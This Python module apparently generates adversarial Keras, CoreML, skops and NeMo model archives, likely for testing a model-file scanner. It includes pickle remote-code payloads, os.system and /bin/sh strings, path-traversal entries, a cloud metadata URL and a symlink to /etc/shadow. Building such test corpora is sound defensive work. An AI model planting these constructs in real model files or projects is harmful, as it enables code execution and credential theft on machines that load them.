"""Archive/container format generators: Keras, CoreML, Skops, NeMo."""

from __future__ import annotations

import io
import json
import random
import struct
import tarfile
import zipfile

from .base import pickle_rce_payload, tar_add_bytes


def gen_keras_zip(rng: random.Random) -> bytes:
    """Generate adversarial Keras v3 .keras ZIP content."""
    config = {
        "module": "keras",
        "class_name": "Functional",
        "config": {
            "layers": [
                {
                    "module": "keras.layers",
                    "class_name": "Lambda",
                    "config": {
                        "name": "lambda_payload",
                        "function": {
                            "class_name": "__lambda__",
                            "config": {
                                "code": "YwAAAAAAAAAAAAAAAAMAAAADAAAA8w==",
                                "defaults": None,
                                "closure": None,
                            },
                        },
                    },
                },
                {
                    "module": "keras.utils",
                    "class_name": rng.choice(["get_file", "func_load"]),
                    "config": {
                        "origin": "http://169.254.169.254/latest/meta-data/",
                        "payload": "__import__('os').system('id')",
                    },
                },
            ],
        },
    }
    metadata = {
        "keras_version": "3.9.0",
        "safe_mode": rng.choice([False, "false", "disabled"]),
    }

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("config.json", json.dumps(config))
        zf.writestr("metadata.json", json.dumps(metadata))
        zf.writestr("model.weights.h5", gen_keras_h5_stub(rng))
        if rng.random() < 0.5:
            zf.writestr("../post_load.py", b"import os\nos.system('id')\n")
    return buf.getvalue()


def gen_keras_h5_stub(rng: random.Random) -> bytes:
    """Generate a Keras HDF5-like payload with dangerous metadata strings."""
    config = json.dumps({
        "class_name": "Lambda",
        "module": "keras.layers",
        "config": {
            "function": {
                "class_name": "__lambda__",
                "config": {"code": "marshal.loads(base64.b64decode('AAAA'))"},
            },
            "command": rng.choice(["os.system('id')", "subprocess.Popen('/bin/sh')"]),
        },
    }).encode()
    return b"\x89HDF\r\n\x1a\n" + b"model_config\x00" + config + b"\x00" * 32


def gen_coreml_package(rng: random.Random) -> bytes:
    """Generate CoreML .mlpackage-like ZIP content."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("Manifest.json", json.dumps({
            "fileFormatVersion": "1.0.0",
            "itemInfoEntries": {
                "model": {"path": "Data/model.mlmodel"},
            },
        }))
        zf.writestr("Data/model.mlmodel", gen_coreml_model(rng))
        zf.writestr("Data/postinstall.sh", b"#!/bin/sh\nid\n")
        if rng.random() < 0.5:
            zf.writestr("../../Library/LaunchAgents/payload.plist", b"pwned")
    return buf.getvalue()


def gen_coreml_model(rng: random.Random) -> bytes:
    """Generate protobuf-like CoreML .mlmodel bytes."""
    prefix = struct.pack("<I", rng.choice([0, 1, 0xFFFFFFFF]))
    return (
        prefix
        + b"neuralNetworkClassifier"
        + rng.choice([b"os.system", b"__import__", b"subprocess.Popen"])
        + b"\x00/bin/sh\x00"
        + pickle_rce_payload()
    )


def gen_skops_zip(rng: random.Random) -> bytes:
    """Generate adversarial skops ZIP content."""
    schema = {
        "__module__": rng.choice(["os", "subprocess", "builtins"]),
        "__class__": rng.choice(["system", "Popen", "eval"]),
        "children": [
            {"__module__": "sklearn.pipeline", "__class__": "Pipeline"},
            {"__module__": "evil.package", "__class__": "Loader"},
        ],
    }
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("schema.json", json.dumps(schema))
        zf.writestr("payload.pkl", pickle_rce_payload())
        if rng.random() < 0.5:
            zf.writestr("../skops_escape.py", b"import os\nos.system('id')\n")
    return buf.getvalue()


def gen_nemo_archive(rng: random.Random) -> bytes:
    """Generate adversarial NVIDIA NeMo tar archive bytes."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        tar_add_bytes(
            tf,
            "model_config.yaml",
            b"trainer:\n  strategy: __import__('os').system('id')\n",
        )
        tar_add_bytes(tf, "model_weights.ckpt", pickle_rce_payload())
        tar_add_bytes(tf, "scripts/post_load.sh", b"#!/bin/sh\n/bin/sh\n")
        tar_add_bytes(tf, "../../tmp/nemo_escape", b"escape")
        if rng.random() < 0.5:
            info = tarfile.TarInfo("shadow_link")
            info.type = tarfile.SYMTYPE
            info.linkname = "/etc/shadow"
            tf.addfile(info)
    return buf.getvalue()
